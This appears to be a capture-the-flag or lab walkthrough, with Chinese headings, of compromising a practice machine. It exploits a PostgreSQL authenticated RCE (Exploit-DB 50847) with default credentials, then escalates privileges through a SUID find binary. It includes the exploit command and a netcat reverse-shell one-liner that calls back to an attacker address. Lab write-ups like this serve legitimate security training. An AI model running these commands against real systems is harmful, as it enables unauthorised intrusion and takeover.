## nmap scanning
- <img width="1918" height="672" alt="image" src="https://github.com/user-attachments/assets/e9bef1b1-ff41-4e03-87e1-2607b5211a12" />

## 5437 port
### 方法1
- PostgreSQL 存在 PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)
  - https://www.exploit-db.com/exploits/50847
- 成功執行腳本
  ```
  python3 50847.py -i 192.168.154.47 -p 5437 -U postgres -P postgres -c 'ls -la /'
  ```
  - <img width="1918" height="757" alt="image" src="https://github.com/user-attachments/assets/d550b9cc-1e69-44fe-96b6-c89ea9ed2531" />
- 取得 reverse shell
  ```
  python3 50847.py -i 192.168.154.47 -p 5437 -U postgres -P postgres -c 'nc -nv 192.168.45.193 22 -e /bin/bash'
  ```
  - <img width="1918" height="690" alt="image" src="https://github.com/user-attachments/assets/01c4c493-8d63-49f8-8f6f-e22e3e6d0f5b" />

### 方法2
- github 上的 poc
  - https://github.com/squid22/PostgreSQL_RCE
- 成功取得 reverse shell
  - <img width="1918" height="677" alt="image" src="https://github.com/user-attachments/assets/4442acad-726d-4a0d-9381-557b41883b82" />
  - <img width="1182" height="250" alt="image" src="https://github.com/user-attachments/assets/487459e8-12ca-4bb0-86d6-85872b394196" />

## 提權
- linpeas.sh 發現 find 有 suid 可以提權
  - <img width="1918" height="525" alt="image" src="https://github.com/user-attachments/assets/028c4511-a5b2-4060-a28f-20773b429fff" />
- GTFOBins 
  - <img width="1367" height="365" alt="image" src="https://github.com/user-attachments/assets/f20a05af-5054-4664-aa51-ce19bc2e2b49" />
- 成功提權
  - <img width="1132" height="192" alt="image" src="https://github.com/user-attachments/assets/7f62ed4e-2781-4adf-ae73-4444e67416d8" />
- 取得 local.txt
  - <img width="1128" height="97" alt="image" src="https://github.com/user-attachments/assets/3a520ceb-158d-46bb-93cf-ad996c5b46e1" />
- 取得 proof.txt
  - <img width="802" height="105" alt="image" src="https://github.com/user-attachments/assets/eb64c421-76aa-47ec-972a-faf33e670e91" />




















































